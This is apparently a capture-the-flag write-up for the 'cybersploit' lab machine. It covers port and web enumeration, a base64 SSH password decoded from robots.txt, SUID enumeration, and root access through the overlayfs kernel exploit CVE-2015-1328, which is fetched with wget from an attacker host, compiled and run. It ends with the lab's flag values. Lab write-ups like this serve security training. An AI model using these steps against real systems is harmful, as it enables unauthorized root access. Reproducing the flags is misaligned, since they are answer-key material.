# [Recon]

```
=========================================================================
[OS]: Ubuntu
[Web-Technology]: Apache httpd 2.2.22
[Hostname]: cybersploit-CTF
[IP]:  192.168.233.92
[USERS]: itsskv
[CREDENTIALS]: itsskv = cybersploit{youtube.com/c/cybersploit}
=========================================================================
```
-----------------------------------------------------------------------------

# [Scanning and Enumeration]

--	[Network Enumeration]

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 01:1b:c8:fe:18:71:28:60:84:6a:9f:30:35:11:66:3d (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAIvXzKChMFQjoRVJPY3oKyzdX27i0MDEbmLG3yRuSLiPgYBF4jGq+7mn848WJSbLPpNAa/6xMgQb5BhhSTHgA77kg1gS8IhXvpoMlixJoJmGVBAqobxKAEbZnfbSKfjtJk7jI9mfoZjmOhznnzEwsODjzEDqtBYGEo4Mf/9KUX/jAAAAFQCdv46IJ36Dkyv7av5KP+Ghs7TzSwAAAIAVxh4PVUljX8ECckYq40LJ/jRL4qWhLSctMRK9J34+WSe2RHpRKRB+0eTpjffzNktRgFgKJJwW+3kd4HzOROMDvLEuhdrALiiNwqxYzIv70i+mwxNWoghoUcslgXOmeTAvyiW/jNU/Uav39nutehkX62PfvTRrulRzlbayMbkU4AAAAIABwdKXqzEKdPr7L+bCBLEe06k3Vd2bWvTOD3wwGzz+rzvmcexiPvgc1xRYE6Fno0QG2yfow9cvgrajyiDoMdUVogH7N8hm3+KbaKnO8mA7jkxVMACpfanwHRVJfM/+PHPOvML2v8QJ7JYGRgwlTyI5UxqUw9YuJSNJWThRWyw49A==
|   2048 d9:53:14:a3:7f:99:51:40:3f:49:ef:ef:7f:8b:35:de (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAgVBhkY/5TpbZpI7WmUiKX7koUuK6+K+usitE5rg6V326mmdJKt69IFmq4gcgpqXuImopLdGczY/8ulNoEj3aaPckhAVG5CLmlGMvRR5h2AW6pI7pUI9NkyAtLkm0fkyLDKLvKS32KSQ9jSdVPeXeCE0EpGJW5J5QOMWxEbS4z3XnLlkLqGz/wPRCwupYjJ+UsAgHfJVDKC7foPZj1ft/XX9oqcNkcykxz3AQtn0sEEZ8MfuWyePiVgYmsDLl0tBGdm0p9GExfWE0KAhpScWaxJzKmSFfzAjVpg60SyegBAhcIs0xMS18cBAS05OHNLKmMCfzOqm+8AjbVAyl+RF3
|   256 ef:43:5b:d0:c0:eb:ee:3e:76:61:5c:6d:ce:15:fe:7e (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPHaPjoo6jLLN7KcEqjZCEXgAdRiejIMlLihehQ7+dmmxs4SqtjA8I8EjiqZpVL6kgSmDX5BpNxmyHjWJRHIC9U=
80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Hello Pentester!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
-----------------------------------------------------------------------------

--	[Web Enumeration]

```
--> Files
=====================================================================
ID           Response   Lines    Word       Chars       Payload                
=====================================================================

000000061:   200        50 L     133 W      2333 Ch     "index.html"           
000000149:   403        10 L     30 W       291 Ch      ".htaccess"            
000000240:   200        1 L      1 W        53 Ch       "robots.txt"           
000000371:   200        50 L     133 W      2333 Ch     "."                    
000000529:   403        10 L     30 W       287 Ch      ".html"                
000001556:   403        10 L     30 W       291 Ch      ".htpasswd"            
000001822:   403        10 L     30 W       286 Ch      ".htm"                 
000002092:   403        10 L     30 W       292 Ch      ".htpasswds"           
000004616:   403        10 L     30 W       290 Ch      ".htgroup"             
000007069:   403        1080/tcp open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))


--> Directories
=====================================================================
ID           Response   Lines    Word       Chars       Payload                 
=====================================================================

000000001:   403        10 L     30 W       290 Ch      "cgi-bin"               
000000229:   403        10 L     30 W       286 Ch      "doc"                   
000000386:   403        10 L     30 W       288 Ch      "icons"                 
000004227:   403        10 L     30 W       296 Ch      "server-status"         
000004255:   200        50 L     133 W      2333 Ch     "http://192.168.233.92//
                                                        " 


```

Tried viewing the page source and a username is been commented out in the html source code
![[Pasted image 20240904214228.png]]
now we have a username which i think we can leverage to log in via `SSH` but we also need a password to log in.

Looking at the above directory and file fuzzing results, nothing too useful other than `/robots.txt` which contains a base64 encoded strings
![[Pasted image 20240904213927.png]]

```bash
echo "Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=" | base64 -d
# cybersploit{youtube.com/c/cybersploit}
``` 
## NB
We just obtain our SSH password `cybersploit{youtube.com/c/cybersploit}`(plain base64 decode)

I SSHed in the machine and voilla we're in.

-----------------------------------------------------------------------------
# [Lateral Movement]

--> SUIDs
```bash
find / -perm -u=s -type f 2>/dev/null
```
	/bin/fusermount
	/bin/ping
	/bin/su
	/bin/umount
	/bin/mount
	/bin/ping6
	/usr/bin/newgrp
	/usr/bin/sudoedit
	/usr/bin/X
	/usr/bin/passwd
	/usr/bin/chfn
	/usr/bin/gpasswd
	/usr/bin/arping
	/usr/bin/chsh
	/usr/bin/sudo
	/usr/bin/mtr
	/usr/bin/lppasswd
	/usr/bin/traceroute6.iputils
	/usr/bin/pkexec
	/usr/bin/at
	/usr/sbin/uuidd
	/usr/sbin/pppd
	/usr/lib/openssh/ssh-keysign
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/policykit-1/polkit-agent-helper-1
	/usr/lib/pt_chown


--> Linpeas.sh
```bash
# kernel exploit
uname -a
cat /etc/*releases
```
![[Pasted image 20240904220032.png]]


-----------------------------------------------------------------------------

# [Privilege-Escalation]

--> Looking at the `SUIDs` above, i notice a unique one in the path `/usr/bin/X` but upon running it nothing happened. So i have to look for other ways to root the machine. I tried almost everything and nothing seems to work but luckily thank God linpeas identifies that the `kernel` is vulnerable to  `CVE-2015-1328 Overlaysfs Local Root in Ubuntu`. 
![[Pasted image 20240904212842.png]]
I went straight and downloaded the exploit which was written in `C programming`, save it to a `.c` file and export to the remote machine.


```bash
cd /tmp
wget http://192.168.45.218:8000/exploit.c
chmod +x exploit.c
gcc exploit.c -o exploit
./exploit

```
![[Pasted image 20240904220331.png]]


-----------------------------------------------------------------------------
# [Take away Concept]
```
=========================================================================
* Check every single possibility including kernel for vulnerabilities
* Never underestimate any base64 encoded string. They mean something mostly
* 

=========================================================================
```

-----------------------------------------------------------------------------
# [Flags]

`local.txt : f2a5e5e98f936b08134e68a7ec0746db`
`proof.txt : 7f491fb21f0d16c55042a762bb08cdd0`
